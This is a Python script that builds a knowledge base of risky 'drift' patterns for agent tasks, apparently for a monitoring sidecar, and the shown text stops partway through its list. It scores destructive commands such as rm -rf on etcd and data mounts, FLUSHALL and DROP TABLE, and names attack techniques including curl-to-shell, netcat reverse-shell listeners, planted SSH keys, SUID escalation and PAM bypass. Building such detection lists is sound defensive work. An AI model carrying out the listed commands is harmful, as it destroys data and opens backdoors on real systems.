"""build_drift_kb.py
把 core/sidecar/knowledge/drift_knowledge.json 从 8 条扩充到 300+ 条
语义漂移模式，提升向量检索区分度。

运行: python data/build_drift_kb.py
"""
from __future__ import annotations
import json, sys, random
from collections import Counter, defaultdict
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
KB_FILE = ROOT / "core" / "sidecar" / "knowledge" / "drift_knowledge.json"

# -------- 内置原始 8 条种子（始终以此为起点） --------
_SEED8 = [
    {"pattern": "跳过 staging 直接 push 生产", "match_keywords": ["staging", "prod", "push main", "skip staging", "deploy"], "violation_score": 0.85, "description": "未走 staging 验证直接上线，违反发布流程，属于高风险漂移"},
    {"pattern": "debug 过程 restart 生产服务", "match_keywords": ["debug", "restart", "systemctl", "prod", "线上"], "violation_score": 0.85, "description": "debug 要求只读不改，重启生产破坏现场且未达 debug 目的"},
    {"pattern": "debug 过程改数据库 schema", "match_keywords": ["debug", "alter table", "mysql", "schema", "index"], "violation_score": 0.90, "description": "debug 不应修改数据库结构，可能影响生产数据"},
    {"pattern": "部署任务执行 git push --force", "match_keywords": ["deploy", "git push", "force", "push --force"], "violation_score": 0.80, "description": "部署不应 force push，会覆盖历史且未走审核"},
    {"pattern": "重构任务删除被引用的文件", "match_keywords": ["refactor", "重构", "rm -rf", "删除", "import"], "violation_score": 0.75, "description": "重构应先改调用处再删旧文件，直接 rm 会导致 ImportError"},
    {"pattern": "清理缓存任务删除业务数据目录", "match_keywords": ["清理缓存", "clean", "rm -rf data", "删除 data", "删业务"], "violation_score": 0.90, "description": "清理缓存不应涉及 data/ 业务数据目录，是高危误操作"},
    {"pattern": "只读任务执行写操作", "match_keywords": ["只读", "read only", "只看", "不要改", "不要写"], "violation_score": 0.80, "description": "只读任务（读日志/查文档/explain）不应有写文件或修改代码操作"},
    {"pattern": "安全审计任务执行破坏性命令", "match_keywords": ["安全审计", "audit", "pentest", "渗透"], "violation_score": 0.85, "description": "安全审计应在隔离环境，不应在生产项目里执行破坏性命令"},
]

# -------- 漂移条目生成模板（每个 tuple: (pattern, match_keywords, description, _cat, raw_score)） --------
# 类别 1: deploy（部署漂移）— 目标 45 条
_DEPLOY = [
("deploy_prod_force_push", ["deploy","prod","git push --force","main","skip review"], "部署任务用 git push --force 直接推 prod 分支，跳过 PR 审核和 CI", 0.85),
("deploy_skip_staging", ["deploy","skip staging","prod","staging","上线"], "deploy 任务声称没 staging 环境直接在 prod 上跑，跳过预发验证高风险", 0.9),
("deploy_restart_prod_mysql", ["deploy","restart","mysql","prod","v2.0"], "deploy 语境下重启 prod mysql 会清空连接池并中断正在运行的事务", 0.9),
("deploy_rm_mount", ["deploy","rm -rf","mount","/data","persistent"], "部署脚本里写 rm -rf /data 挂载点，会直接擦除持久化卷", 0.95),
("deploy_chmod_777_bin", ["deploy","chmod 777","bin","permission","executable"], "deploy 脚本对 /usr/local/bin 下的可执行文件 chmod 777，破坏权限边界", 0.8),
("deploy_override_env", ["deploy",".env","cp -f","prod","override"], "deploy 用本地 .env 直接 cp 覆盖 prod 环境的 .env，可能泄露密钥", 0.85),
("deploy_kill_worker", ["deploy","kill -9","worker","job","中断"], "deploy 过程中 kill -9 worker 进程，可能让正在处理的任务丢失", 0.7),
("deploy_alter_table", ["deploy","ALTER TABLE","prod","mysql","schema"], "deploy 里跑 ALTER TABLE prod 大表，会锁表造成线上写阻塞", 0.85),
("deploy_truncate_log", ["deploy","TRUNCATE TABLE","log","audit","prod"], "deploy 任务里 TRUNCATE 生产日志表，会丢失审计轨迹", 0.8),
("deploy_redis_flush", ["deploy","redis","FLUSHALL","cache","prod"], "deploy 脚本中 redis-cli FLUSHALL，清掉整个 prod redis 缓存引发雪崩", 0.9),
("deploy_docker_rmf", ["deploy","docker rm -f","container","prod","force"], "deploy 用 docker rm -f 强制删除正在运行的 prod 容器而非 graceful stop", 0.8),
("deploy_systemd_stop", ["deploy","systemctl stop","prod","service","zero downtime"], "deploy 任务第一步 systemctl stop 生产服务，破坏零停机发布", 0.8),
("deploy_pip_upgrade_runtime", ["deploy","pip install","--upgrade","runtime","dependency"], "deploy 过程中 pip install --upgrade 所有运行时依赖，可能引入不兼容", 0.65),
("deploy_git_reset_hard", ["deploy","git reset --hard","HEAD~","commit","丢失"], "deploy 语境执行 git reset --hard HEAD~3，会丢失本地提交不可恢复", 0.8),
("deploy_change_nginx", ["deploy","nginx.conf","reload","upstream","prod"], "deploy 任务修改 nginx.conf 并 reload，可能把流量切到错误 upstream", 0.75),
("deploy_create_admin_user", ["deploy","CREATE USER","admin","prod","superuser"], "deploy 脚本里 CREATE USER admin WITH SUPERUSER 在 prod 上，属于越权", 0.85),
("deploy_no_rollback_plan", ["deploy","rollback","checklist","上线","回滚"], "deploy 任务描述里完全没有回滚策略，违反上线 checklist", 0.6),
("deploy_force_deploy_staging", ["deploy","force push","staging","branch","覆盖"], "deploy 任务用 force push 覆盖 staging 分支，污染预发环境", 0.7),
("deploy_mv_config_dev", ["deploy","mv","config.dev","config.prod","prod"], "deploy mv config.dev.yaml config.prod.yaml，开发环境配置误上线", 0.85),
("deploy_wget_pipe_bash", ["deploy","wget","pipe bash","install","remote script"], "deploy 用 wget -qO- | bash 直接执行远程脚本，供应链风险", 0.9),
("deploy_curl_pipe_sh", ["deploy","curl","pipe sh","bootstrap","verify"], "deploy 开头跑 curl -sS | sh 下载执行脚本，没有校验 sha256", 0.9),
("deploy_delete_pid", ["deploy","rm -f","pid","残留","start"], "deploy 里 rm -f 所有 *.pid 文件再 start，掩盖进程仍在运行的真实状态", 0.7),
("deploy_go_get_u", ["deploy","go get -u","dependency","upgrade","全部"], "deploy 时 go get -u ./... 全量升级依赖，引入不可控变更", 0.65),
("deploy_git_clean_fd", ["deploy","git clean","工作区","untracked","fd"], "deploy 语境执行 git clean -fd，可能删除未纳入版本控制但被依赖的文件", 0.7),
("deploy_rebase_i", ["deploy","git rebase","history","commit","上线"], "deploy 任务开始 rebase -i 修改历史，不该在上线路径上做", 0.7),
("deploy_postgres_reload", ["deploy","pg_reload_conf","postgres","prod","config"], "deploy 任务触发 pg_reload_conf 在生产 postgres，可能加载错误配置", 0.75),
("deploy_mysqladmin_flush", ["deploy","mysqladmin","flush","hosts","prod"], "deploy 时 mysqladmin flush-hosts flush-logs，生产连接可能被异常中断", 0.7),
("deploy_set_global_wait_timeout", ["deploy","SET GLOBAL","wait_timeout","mysql","prod"], "deploy 直接 SET GLOBAL wait_timeout=30 在 prod mysql，影响所有连接", 0.75),
("deploy_redis_config_set", ["deploy","redis-cli","CONFIG SET","maxmemory","prod"], "deploy 过程中 redis-cli CONFIG SET 修改 prod redis 的 maxmemory 配置", 0.7),
("deploy_es_close_index", ["deploy","elasticsearch","close index","prod","curl"], "deploy 任务用 curl 关闭 elasticsearch 的 prod 索引，搜索不可用", 0.85),
("deploy_rm_data_worker", ["deploy","rm -rf","worker","data","持久化"], "deploy 脚本里 rm -rf worker/data，删除 worker 的持久化状态", 0.8),
("deploy_chown_daemon_data", ["deploy","chown","daemon","/data","permission"], "deploy 把 /data 目录所有权改成 daemon，可能导致其他进程无权限读写", 0.75),
("deploy_touch_rebuild_trigger", ["deploy","touch","force rebuild","trigger","rebuild"], "deploy 任务用 touch 创建 force-rebuild 文件让下一流程强制重建", 0.55),
("deploy_kafka_delete_topic", ["deploy","kafka","delete topic","prod","消息"], "deploy 任务里删除 prod kafka topic，会丢失未消费消息", 0.9),
("deploy_rabbitmq_purge", ["deploy","rabbitmq","purge queue","prod","messages"], "deploy 时 purge 生产 rabbitmq 队列，所有在途消息丢失", 0.85),
("deploy_change_secret", ["deploy","secret","kubernetes","prod","鉴权"], "deploy 任务在没通知下游的情况下替换 kubernetes secret 导致鉴权失败", 0.8),
("deploy_revert_without_pr", ["deploy","git revert","PR","审核","hotfix"], "deploy 语境下直接 git revert 线上 bug，不通过 PR 审核", 0.7),
("deploy_rollback_failed_missing", ["deploy","rollback.sh","missing","回滚","上线"], "deploy 完成主流程但 rollback.sh 不存在，一旦出错无法回退", 0.65),
("deploy_helm_upgrade_without_test", ["deploy","helm upgrade","--wait","kubernetes","prod"], "deploy 用 helm upgrade 不带 --wait，pod 还没 ready 就报成功", 0.7),
("deploy_minikube_on_prod", ["deploy","minikube","prod","kubernetes","dev cluster"], "deploy 目标环境写 minikube 但标注为 prod，明显混淆", 0.8),
("deploy_override_coredns", ["deploy","Corefile","dns","override","prod"], "deploy 任务直接覆盖 /etc/coredns/Corefile，内网域名解析中断", 0.85),
("deploy_rm_etcd_data", ["deploy","etcd","member","rm -rf","集群"], "deploy 脚本中 rm -rf /var/lib/etcd/member，整个 k8s 集群失联", 0.95),
("deploy_prometheus_delete_tsdb", ["deploy","prometheus","tsdb","rm -rf","监控"], "deploy 任务删除 Prometheus /prometheus 数据目录，监控历史清空", 0.8),
("deploy_grafana_delete_dashboard", ["deploy","grafana","dashboard","delete","prod"], "deploy 顺手把 prod Grafana 上的 dashboard JSON 删掉，运维没面板", 0.75),
("deploy_override_fluentd_config", ["deploy","fluentd","config","override","log"], "deploy 覆盖 fluentd 的 prod 配置导致日志全部打到 /dev/null", 0.8),
]

# 类别 2: debug（debug 漂移）— 目标 50 条
_DEBUG = [
("debug_restart_prod", ["debug","restart","prod","systemctl","只读"], "debug 任务要求只读，restart prod 服务会破坏现场且中断业务", 0.85),
("debug_alter_table", ["debug","ALTER TABLE","mysql","prod","schema"], "debug 只读场景不应改 prod 表结构，锁表会阻塞生产写入", 0.9),
("debug_drop_index", ["debug","DROP INDEX","index","prod","mysql"], "debug 任务里 DROP INDEX 会让查询变慢并造成线上性能抖动", 0.85),
("debug_write_file", ["debug","write","config","只读","tee >"], "debug 任务里 tee 或 cp 改配置文件，违反只读约束", 0.8),
("debug_delete_log", ["debug","rm -f","log","只读","删除"], "debug 只读巡检里顺手 rm -f 了 *.log，丢失诊断线索", 0.75),
("debug_rm_cache_data", ["debug","rm -rf","data","cache","删除业务"], "debug 语境下清理缓存但 rm -rf 整个 data/，把业务数据一起删了", 0.9),
("debug_redis_flush", ["debug","redis","FLUSHALL","prod","cache"], "debug 任务为了复现问题 FLUSHALL prod redis，引发缓存雪崩", 0.9),
("debug_truncate_table", ["debug","TRUNCATE TABLE","prod","log","mysql"], "debug 只读巡检中 TRUNCATE TABLE prod logs，丢失审计", 0.85),
("debug_kill_prod_proc", ["debug","kill -9","orders-service","prod","进程"], "debug 任务 kill -9 prod 上的 orders-service 进程，业务中断", 0.9),
("debug_systemctl_stop", ["debug","systemctl stop","prod","只读","service"], "debug 只读任务执行 systemctl stop prod 服务，完全违反只读", 0.9),
("debug_overwrite_env", ["debug",".env","cp -f","prod","只读"], "debug 任务用本地 .env 覆盖 prod .env，可能改坏线上配置", 0.85),
("debug_chmod_777", ["debug","chmod 777","secure","/var/log","permission"], "debug 为了方便 chmod 777 /var/log/secure，破坏安全边界", 0.85),
("debug_force_pip_install", ["debug","pip install -e","site-packages","只读","install"], "debug 只读诊断里 pip install -e . 往系统 site-packages 装包", 0.7),
("debug_git_commit", ["debug","git commit","只读","history","修改"], "debug 只读巡检顺手 git commit 改动，污染主分支历史", 0.8),
("debug_git_push", ["debug","git push","prod","只读","force"], "debug 语境下 git push 到 prod 分支，明显越权", 0.9),
("debug_git_reset_hard", ["debug","git reset --hard","commit","只读","reset"], "debug 任务用 git reset --hard HEAD 清掉了现场改动，丢失线索", 0.75),
("debug_kafka_delete_topic", ["debug","kafka","delete topic","prod","messages"], "debug 任务为了复现问题删除 prod kafka topic，消息全部丢失", 0.95),
("debug_rabbitmq_purge", ["debug","rabbitmq","purge queue","prod","messages"], "debug 诊断里 purge rabbitmq prod 队列，清空所有在途消息", 0.9),
("debug_etcd_rm", ["debug","etcd","rm -rf","member","cluster"], "debug 脚本里 rm -rf /var/lib/etcd/member，可能击穿整个 k8s 集群", 0.95),
("debug_postgres_kill", ["debug","pg_terminate_backend","postgres","prod","connection"], "debug 任务用 pg_terminate_backend 把 prod postgres 的所有连接都杀掉", 0.9),
("debug_mysql_shutdown", ["debug","mysqladmin","shutdown","prod","只读"], "debug 只读巡检 mysqladmin shutdown prod，mysql 直接停了", 0.95),
("debug_es_close_index", ["debug","elasticsearch","close index","prod","search"], "debug 任务为了观察恢复过程把 prod elasticsearch 索引全关了", 0.85),
("debug_nginx_conf_edit", ["debug","nginx.conf","reload","prod","只读"], "debug 任务修改 nginx.conf 然后 reload，可能把生产流量切错", 0.8),
("debug_iptables_flush", ["debug","iptables -F","firewall","prod","只读"], "debug 只读任务里 iptables -F 把服务器防火墙规则全清了", 0.9),
("debug_flush_arp", ["debug","ip neigh","flush all","ARP","prod"], "debug 只读巡检里执行 ip neigh flush all，清空 ARP 表", 0.75),
("debug_nscd_invalidate", ["debug","nscd","invalidate","cache","只读"], "debug 为了解决 DNS 问题 invalidate nscd 缓存但属于写操作", 0.65),
("debug_restart_nginx", ["debug","restart","nginx","prod","只读"], "debug 任务 restart prod nginx，现场被破坏", 0.85),
("debug_restart_etcd", ["debug","restart","etcd","prod","cluster"], "debug 重启 prod etcd，影响整个 kubernetes 集群的稳定性", 0.9),
("debug_restart_redis", ["debug","restart","redis","prod","cache"], "debug 只读任务 restart prod redis，缓存被清空且瞬间雪崩", 0.9),
("debug_restart_mysql", ["debug","restart","mysql","prod","只读"], "debug 任务 restart prod mysql，所有在途事务被中断", 0.95),
("debug_restart_kafka", ["debug","restart","kafka","prod","broker"], "debug 重启 prod kafka，消息 broker 短暂不可用", 0.85),
("debug_change_log_level", ["debug","LOG_LEVEL","DEBUG","env","prod"], "debug 任务修改 prod 应用的 LOG_LEVEL 为 DEBUG，产生大量日志", 0.7),
("debug_change_cpu_limit", ["debug","cpu limit","resources","pod","kubernetes"], "debug 调整 pod 的 resources.limits.cpu，改变了原部署规格", 0.75),
("debug_change_mem_limit", ["debug","memory limit","resources","pod","prod"], "debug 改 memory limit 给 prod pod，可能 OOM 或资源浪费", 0.7),
("debug_exec_sql_delete", ["debug","DELETE FROM","orders","prod","只读"], "debug 只读巡检里手工 DELETE FROM prod orders，业务数据被删", 0.95),
("debug_exec_sql_update", ["debug","UPDATE","prod","sql","只读"], "debug 任务里手工 UPDATE ... SET status='debug' 在 prod 上", 0.9),
("debug_reload_pgbouncer", ["debug","pgbouncer","reload","config","prod"], "debug 任务 reload pgbouncer 配置，可能把错误的 pool 配置加载进 prod", 0.7),
("debug_haproxy_reload", ["debug","haproxy","reload","prod","只读"], "debug 只读任务 reload haproxy 生产配置，流量可能被切断", 0.8),
("debug_rm_supervisor_conf", ["debug","supervisor","rm -f","conf","prod"], "debug 任务顺手 rm -f /etc/supervisor/conf.d/*.conf，服务再也起不来", 0.85),
("debug_cron_rm", ["debug","crontab -r","cron","prod","只读"], "debug 任务执行 crontab -r，把 prod 上所有定时任务清了", 0.95),
("debug_overwrite_cron", ["debug","crontab","overwrite","cron","prod"], "debug 任务 echo > /etc/crontab 覆盖了 prod 的定时任务配置", 0.85),
("debug_swapoff", ["debug","swapoff","prod","memory","只读"], "debug 只读任务执行 swapoff -a，prod 机器 OOM 概率大增", 0.8),
("debug_touch_rebuild", ["debug","touch","rebuild","marker","prod"], "debug 任务创建 rebuild marker 文件，触发下一次 CI 重建 prod", 0.7),
("debug_chown_nobody", ["debug","chown","nobody","/etc","prod"], "debug 任务 chown -R nobody /etc，系统基本半瘫", 0.95),
("debug_rm_dev_null", ["debug","mv /dev/null","worker","binary","prod"], "debug 里 mv /dev/null /usr/local/bin/worker，worker 二进制被替换成空", 0.95),
("debug_apt_install", ["debug","apt-get install","prod","package","只读"], "debug 只读巡检里 apt-get install netcat 等工具装到 prod 机器", 0.65),
("debug_change_sysctl", ["debug","sysctl -w","kernel","prod","只读"], "debug 任务 sysctl -w 改 prod 的内核参数，持久化也没做但当前已生效", 0.75),
("debug_drop_schema", ["debug","DROP SCHEMA","postgres","prod","只读"], "debug 巡检中 DROP SCHEMA analytics CASCADE，整个 schema 及其表全部消失", 0.95),
("debug_create_table", ["debug","CREATE TABLE","postgres","prod","只读"], "debug 任务在 prod 数据库里 CREATE TABLE debug_tmp，污染 schema", 0.7),
("debug_kill_prometheus", ["debug","kill","prometheus","prod","监控"], "debug 任务 kill prod 上的 prometheus pod，监控断了", 0.85),
]

# 类别 3: refactor（重构漂移）— 目标 40 条
_REFACTOR = [
("refactor_delete_used_file", ["refactor","rm -rf","import","依赖","删除旧"], "refactor 任务 rm -rf 被其他模块 import 的 util.py，上线就 ImportError", 0.85),
("refactor_rename_broken_import", ["refactor","rename","import","broken","重构"], "refactor 里只改文件名不改所有 import 语句，CI 过不了", 0.75),
("refactor_force_pattern", ["refactor","match","if-else","force","pattern"], "refactor 任务要求所有 if-else 都改成 Python match-case，不顾兼容性", 0.6),
("refactor_rm_test_data", ["refactor","fixtures","rm -rf","test data","删除"], "refactor 里顺手 rm -rf tests/fixtures/，后续回归测试无数据", 0.7),
("refactor_move_to_wrong_dir", ["refactor","move","auth","import","directory"], "refactor 把 auth 模块移错层级，所有相对 import 断了", 0.75),
("refactor_replace_superclass", ["refactor","superclass","BaseModel","SqlAlchemy","subclass"], "refactor 把 BaseModel 改成 SqlAlchemy 而不检查子类行为差异", 0.75),
("refactor_rename_public_api", ["refactor","public api","signature","deprecation","breaking"], "refactor 改了对外接口但没发 deprecation warning，下游调用方挂了", 0.8),
("refactor_delete_env_example", ["refactor",".env.example","rm -f","env","onboarding"], "refactor 顺手删了 .env.example，新同事不知道该配什么环境变量", 0.6),
("refactor_git_push_force", ["refactor","git push --force","branch","force","重构"], "refactor 任务用 git push --force 覆盖了正在并行开发的分支", 0.8),
("refactor_inline_secret", ["refactor","secret","hardcode","settings.py","password"], "refactor 时为了方便把 DB_PASSWORD 直接写进 settings.py 常量", 0.9),
("refactor_remove_try_catch", ["refactor","try-catch","exception","simplify","error"], "refactor 简化代码时去掉了 try-catch，外部依赖挂掉直接崩服务", 0.7),
("refactor_remove_retry", ["refactor","retry","remove","downstream","error"], "refactor 认为重试是坏味道删掉，下游偶发抖动变成真实故障", 0.65),
("refactor_demote_log", ["refactor","log level","error","debug","observability"], "refactor 把关键 error 级别日志改成 debug，生产故障时无日志可查", 0.7),
("refactor_merge_config", ["refactor","yaml","merge","env","config"], "refactor 把 settings.dev.yaml 和 settings.prod.yaml 合并成一个导致环境串用", 0.75),
("refactor_delete_migration", ["refactor","migration","alembic","delete","schema"], "refactor 顺手删掉未执行的 Alembic migration 文件，数据库变更丢了", 0.8),
("refactor_bundle_size_up", ["refactor","bundle","size","frontend","dependencies"], "refactor 引入大依赖导致前端 bundle 从 2MB 变成 6MB，首屏变慢", 0.65),
("refactor_tighten_loop", ["refactor","ThreadPoolExecutor","sync","thread","perf"], "refactor 把 ThreadPoolExecutor 改成同步调用，吞吐下降 10x", 0.8),
("refactor_replace_with_sleep", ["refactor","Event.wait","time.sleep","threading","race"], "refactor 简化时用 time.sleep 替换 threading.Event.wait，死锁概率上升", 0.7),
("refactor_remove_idempotency", ["refactor","idempotency","dedup","payment","refactor"], "refactor 认为幂等 key 没用删掉，网络抖动导致重复扣款", 0.85),
("refactor_circular_import", ["refactor","circular import","import","cycle","启动"], "refactor 把类定义挪位置后出现 A→B→A 循环依赖，启动失败", 0.8),
("refactor_fix_name_conflict", ["refactor","naming","conflict","variable","semantics"], "refactor 修了 foo 和 Foo 的命名冲突，把变量名换成 bar 同时语义也变了", 0.6),
("refactor_lint_only", ["refactor","pylint","lint","logic","bug"], "refactor 跑通 pylint 就认为完成，实际逻辑 bug 未被发现", 0.55),
("refactor_rewrite_sql", ["refactor","sql","WHERE","full table scan","perf"], "refactor 重写 SQL 查询时丢了 WHERE 子句，变成全表扫描", 0.85),
("refactor_decouple_coupling", ["refactor","decouple","http","latency","service"], "refactor 过度解耦把本地调用变成 HTTP 跨服务调用，延迟上升", 0.65),
("refactor_delete_docstring", ["refactor","docstring","delete","comment","readability"], "refactor 认为 docstring 冗余删掉，新人读代码困难", 0.55),
("refactor_dynamic_import", ["refactor","dynamic import","getattr","importlib","static analysis"], "refactor 把显式 import 改成动态 getattr(importlib, 'foo')，静态分析失效", 0.7),
("refactor_rm_mock_data", ["refactor","mock server","delete","frontend","联调"], "refactor 顺手删了 mock server，前端联调断了", 0.7),
("refactor_mv_config_hardcoded", ["refactor","config","yaml","hardcode","deploy"], "refactor 去掉 YAML 读取改成硬编码 dict，配置变更必须重新编译", 0.75),
("refactor_change_test_mock", ["refactor","mock","test","semantics","refactor"], "refactor 同步改测试 mock 但改的是返回值语义，真实行为未覆盖", 0.6),
("refactor_remove_dockerfile_step", ["refactor","Dockerfile","COPY","requirements","build"], "refactor 优化 Dockerfile 时删掉 COPY requirements.txt，镜像构建失败", 0.8),
("refactor_pinned_deps_upgrade", ["refactor","poetry.lock","upgrade","dependency","pin"], "refactor 顺手把 poetry.lock 里的依赖升级了，CI 过不了", 0.7),
("refactor_rename_env_var", ["refactor","env","DB_HOST","DATABASE_URL","rename"], "refactor 把 DB_HOST 改成 DATABASE_URL 但 prod 里只改了一半配置", 0.8),
("refactor_use_global_var", ["refactor","global","variable","race","concurrency"], "refactor 把函数参数去掉，改用模块级全局变量，并发时竞态", 0.75),
("refactor_replace_list_with_iter", ["refactor","list","generator","iterator","两次"], "refactor 把 list 改成 generator，但下游代码迭代了两次导致第二次为空", 0.7),
("refactor_remove_nullable", ["refactor","nullable","migration","NULL","schema"], "refactor 把数据库字段 nullable=false 但老数据有 NULL，插入失败", 0.85),
("refactor_change_index", ["refactor","index","GIN","B-tree","postgres"], "refactor 把 B-tree 改成 GIN 但查询语句没改，索引完全用不上", 0.75),
("refactor_drop_table_column", ["refactor","DROP COLUMN","etl","postgres","schema"], "refactor 删除老字段 DROP COLUMN 但还有 ETL 在写这个列，ETL 挂", 0.85),
("refactor_git_clean", ["refactor","git clean","untracked","import","conflict"], "refactor 开始前没 git clean -fd，残留文件被新 import 引用，最终 import 冲突", 0.6),
("refactor_commit_bisect", ["refactor","bisect","commit","test","逐提交"], "refactor 做了 20 个小 commit 但每个都过不了测试，bisect 失效", 0.65),
("refactor_fix_tests_too_easy", ["refactor","assertTrue","assertEqual","test","loosen"], "refactor 过测试为目的把 assertEqual(200) 改成 assertTrue()，质量没保证", 0.7),
]

# 类别 4: cleanup（清理漂移）— 目标 35 条
_CLEANUP = [
("cleanup_cache_delete_data", ["cleanup","cache","rm -rf data","业务数据","误删"], "cleanup cache 任务执行 rm -rf data/ 业务数据目录，数据永久丢失", 0.95),
("cleanup_delete_db", ["cleanup","DROP DATABASE","staging","mysql","drop"], "cleanup 脚本里 DROP DATABASE staging，虽然是 staging 但含测试数据和 seed", 0.85),
("cleanup_rm_mount", ["cleanup","rm -rf","mount","/mnt/data","data"], "cleanup 任务里 rm -rf /mnt/data 挂载点，数据盘永久丢失", 0.95),
("cleanup_truncate_prod_logs", ["cleanup","TRUNCATE TABLE","prod","logs","audit"], "cleanup 任务顺手 TRUNCATE prod 的 logs 表，审计轨迹丢失", 0.9),
("cleanup_redis_flush_prod", ["cleanup","redis","FLUSHALL","prod","cache"], "cleanup cache 语境下 redis-cli FLUSHALL prod redis，缓存雪崩", 0.95),
("cleanup_rm_backup", ["cleanup","backup","rm -rf","restore","生产"], "cleanup 任务把 /var/backup 旧备份 rm -rf 了，恢复点没了", 0.9),
("cleanup_kafka_delete_topic_prod", ["cleanup","kafka","delete topic","prod","topic"], "cleanup 任务把 prod kafka 的 orders topic 删除，在途消息丢失", 0.95),
("cleanup_rabbitmq_purge_prod", ["cleanup","rabbitmq","purge queue","prod","billing"], "cleanup 时 purge 了 rabbitmq prod 的 billing 队列，消息丢失", 0.95),
("cleanup_drop_collection_mongo", ["cleanup","mongodb","drop","collection","prod"], "cleanup 任务 db.users.drop() 在 prod mongo，整个 collection 清空", 0.95),
("cleanup_es_delete_index", ["cleanup","elasticsearch","delete index","prod","search"], "cleanup 删除 elasticsearch 的 prod search 索引，搜索能力归零", 0.9),
("cleanup_truncate_clickhouse", ["cleanup","clickhouse","TRUNCATE","prod","logs"], "cleanup 任务 TRUNCATE prod clickhouse 日志表，历史查询没数据", 0.85),
("cleanup_rm_etcd", ["cleanup","etcd","member","rm -rf","k8s"], "cleanup 清理 etcd 数据但 rm -rf /var/lib/etcd/member，集群失联", 0.95),
("cleanup_rm_prometheus_tsdb", ["cleanup","prometheus","tsdb","rm -rf","监控"], "cleanup 删除 /prometheus TSDB 目录，监控历史清空", 0.8),
("cleanup_rm_grafana_dashboard", ["cleanup","grafana","dashboard","delete","prod"], "cleanup 把 prod Grafana 的 dashboard JSON 顺手删了，运维没面板", 0.75),
("cleanup_git_clean_fd_prod", ["cleanup","git clean","fd","prod","密钥"], "cleanup 任务在 prod 机器的代码目录跑 git clean -fd，本地配置和密钥被删", 0.85),
("cleanup_rm_env_prod", ["cleanup",".env","rm -f","prod","env"], "cleanup 任务删了 .env.prod，服务重启时读不到环境变量", 0.9),
("cleanup_rm_ssl_cert", ["cleanup","ssl","cert","rm -f","https"], "cleanup 任务删除 /etc/ssl/prod/*.pem，HTTPS 全部证书失效", 0.95),
("cleanup_rm_nginx_conf", ["cleanup","nginx.conf","rm -f","nginx","config"], "cleanup 时把 nginx.conf 删掉，nginx 起不来了", 0.9),
("cleanup_rm_systemd_unit", ["cleanup","systemd","unit","rm -f","service"], "cleanup 任务删除 /etc/systemd/system/orders.service，服务再也起不来", 0.9),
("cleanup_cron_rm_prod", ["cleanup","crontab -r","cron","prod","定时"], "cleanup 执行 crontab -r 把 prod 的定时任务清干净", 0.95),
("cleanup_rm_fluentd_buffer", ["cleanup","fluentd","buffer","rm -rf","日志"], "cleanup 时 rm -rf /var/log/fluentd/buffer，在途日志丢失", 0.8),
("cleanup_rm_haproxy_state", ["cleanup","haproxy","state","rm -rf","sticky"], "cleanup 把 haproxy 的状态目录 rm -rf，连接表和 sticky session 丢了", 0.75),
("cleanup_rm_supervisor_conf", ["cleanup","supervisor","conf.d","rm -f","process"], "cleanup 任务 rm -f supervisor conf.d/*.conf，受管进程全没了", 0.9),
("cleanup_drop_user_table", ["cleanup","DROP TABLE","users","prod","数据"], "cleanup 脚本里 DROP TABLE users 在 prod，用户数据全没了", 0.95),
("cleanup_delete_seed_data", ["cleanup","seed","fixture","delete","test"], "cleanup 删了 tests/seed.sql 和 seeding.py，环境无法重置", 0.7),
("cleanup_rm_init_script", ["cleanup","init.sh","bootstrap","delete","setup"], "cleanup 顺手删了 init.sh bootstrap.sh，新环境起不来", 0.75),
("cleanup_rm_backup_script", ["cleanup","backup.sh","delete","backup","ops"], "cleanup 把 backup.sh rm -f，后续无人做备份了", 0.8),
("cleanup_rm_gitignore", ["cleanup",".gitignore","delete","commit","build"], "cleanup 误删了 .gitignore，dist build 产物被提交进仓库", 0.65),
("cleanup_rm_docker_compose", ["cleanup","docker-compose.yml","delete","local","dev"], "cleanup 把 docker-compose.yml 删了，本地和 CI 环境都起不来", 0.7),
("cleanup_rm_makefile", ["cleanup","Makefile","delete","build","test"], "cleanup 任务删了 Makefile，make test / make build 全失效", 0.65),
("cleanup_rm_readme", ["cleanup","README.md","delete","onboarding","文档"], "cleanup 顺手删了 README.md，新人不知怎么装运行", 0.55),
("cleanup_rm_dockerfile", ["cleanup","Dockerfile","delete","build","ci"], "cleanup 删了 Dockerfile，CI/CD 无法构建镜像", 0.75),
("cleanup_rm_requirements", ["cleanup","requirements.txt","delete","pip","install"], "cleanup 把 requirements.txt 删了，pip install 失败", 0.7),
("cleanup_rm_pyproject", ["cleanup","pyproject.toml","delete","poetry","build"], "cleanup 删了 pyproject.toml，poetry 和打包都起不来", 0.75),
("cleanup_rm_vscode_settings", ["cleanup",".vscode","settings","rm -rf","ide"], "cleanup 顺手删了 .vscode 目录，团队统一的 IDE 配置没了", 0.5),
]

# 类别 5: security（安全漂移）— 目标 30 条
_SECURITY = [
("security_curl_pipe_sh", ["security","curl","pipe sh","remote","install"], "security 任务里 curl pipe sh 无校验地执行远程脚本，供应链攻击风险", 0.95),
("security_wget_pipe", ["security","wget","pipe bash","verify","remote script"], "security 审计中用 wget pipe bash，没 sha256 没签名校验", 0.95),
("security_install_backdoor", ["security","pip install","pypi","backdoor","package"], "security 任务 pip install 一个小众 PyPI 包，来源不明", 0.95),
("security_nc_listen", ["security","nc -l","listener","reverse shell","port"], "security 任务里 nc -l -p 4444 监听，疑似反弹 shell", 0.95),
("security_iptables_open", ["security","iptables","ACCEPT","firewall","all port"], "security 审计时 iptables -I INPUT -j ACCEPT 把防火墙洞穿了", 0.9),
("security_disable_selinux", ["security","setenforce","SELinux","disable","permissive"], "security 任务 setenforce 0 永久关闭 SELinux，安全边界没了", 0.9),
("security_disable_uac", ["security","ufw disable","firewall","ubuntu","disable"], "security 任务执行 ufw disable，Ubuntu 防火墙直接关了", 0.9),
("security_add_ssh_key", ["security","authorized_keys","ssh key","backdoor","公钥"], "security 审计时 echo 陌生公钥到 ~/.ssh/authorized_keys，留后门", 0.95),
("security_chmod_777_etc", ["security","chmod 777","passwd","/etc","permission"], "security 任务 chmod 777 /etc/passwd，任何人可以写 root 密码", 0.95),
("security_add_suid", ["security","suid","chmod u+s","privilege","escalation"], "security 审计中 chmod u+s /tmp/run.sh，普通用户可提权", 0.95),
("security_pam_modify", ["security","PAM","sshd","password","skip"], "security 任务修改 /etc/pam.d/sshd 跳过密码验证", 0.95),
("security_cron_reverse_shell", ["security","crontab","reverse shell","bash -i","cron"], "security 任务 crontab -e 加反弹 shell 命令", 0.95),
("security_env_backdoor", ["security",".bashrc","alias","backdoor","env"], "security 审计里在 ~/.bashrc 加 alias vi='curl ... | bash'", 0.9),
